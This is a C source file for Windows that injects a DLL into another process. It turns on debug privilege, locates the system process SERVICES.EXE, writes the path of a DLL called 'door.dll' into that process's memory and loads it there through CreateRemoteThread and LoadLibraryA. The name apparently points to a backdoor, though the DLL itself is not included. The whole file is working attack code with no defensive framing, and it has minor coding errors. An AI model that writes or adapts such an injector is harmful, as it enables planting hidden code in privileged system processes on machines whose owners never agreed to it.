#include <windows.h>
#include <iostream.h>
#include <tlhelp32.h>
#include <stdio.h>

int EnableDebugPriv(const char * name){
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    //Open process token 
    OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &hToken
    );

    //Gain process local ID
    LookupPrivilegeValue(NULL, name, &luid);

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    tp.Privileges[0].Luid = luid;

    //adjust privilege
    AdjustTokenPrivileges(hToken, 0, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    return 0;
}

BOOL InjectDLL(const char *DllFullPath, const DWORD dwRemoteProcessId){
    HANDLE hRemoteProcess, hRemoteThread;
    char * pszLibFileRemote;
    PTHREAD_START_ROUTINE pfnStartAddr;
    //open debug mode to get high privilege
    EnableDebugPriv(SE_DEBUG_NAME);

    //open remote thread
    hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwRemoteProcessId);

    //alloc virtual space to save dll's name in remote process memory space;
    pszLibFileRemote = (char *)VirtualAllocEx(hRemoteProcess, NULL, 
            lstrlen(DllFullPath)+1, MEM_COMMIT, PAGE_READWRITE);

    //write the dll's name into remote process space that just alloted 
    WriteProcessMemory(hRemoteProcess, pszLibFileRemote, 
            (void*)DllFullPath, lstrlen(DllFullPath)+1, NULL);

    //do calculation to get the entry address for LoadLibraryA func.
    pfnStartAddr = (PTHREAD_START_ROUTINE)GetProcAddress(
            GetModuleHandle(TEXT("Kernel32.dll")), "LoadLibraryA");

    //start LoadLibraryA, create new thread through remote thread
    hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, pfnStartAddr, 
            pszLibFileRemote, 0, NULL);

    if(hRemoteThread == NULL){
        printf("inject thread failed.\n");
        return FALSE;
    }else{
        printf("inject thread success!!!\n");
    }

    CloseHandle(hRemoteProcess);
    CloseHandle(hRemoteThread);
    return TRUE;
}

DWORD GetProcessId(){
    DWORD Pid = -1;
    char * targetFile = "SERVICES.EXE";
    PROCESSENTRY32 lPrs;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    //create system snapshot
    ZeroMemory(&lPrs, sizeof(lPrs));
    lPrs.dwSize = sizeof(lPrs);
    Process32First(hSnap, &lPrs);

    //get first process's info in system snapshot
    if(strstr(targetFile, lPrs.szExeFile)){ 
        Pid = lPrs.th32ProcessID;
        return Pid;
    }

    while(1){
        ZeroMemory(&lPrs, sizeof(lPrs));
        lPrs.dwSize = (&lPrs, sizeof(lPrs));
        //go on enumerating process's info
        if(!Process32Next(hSnap, &lPrs)){
            Pid = -1;
            break;
        }

        if(strstr(targetFile, lPrs.szExeFile)){
            Pid = lPrs.th32ProcessID;
            break;
        }
    }

    return Pid;
}

void main(){
    char myFILE[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, myFILE);
    //get current path concat with myFILE
    strcat(myFILE, "\\door.dll"); 
    //notice!! GetProcessId is which process ID that you want to inject;
    InjectDLL(myFILE, GetProcessId());
}
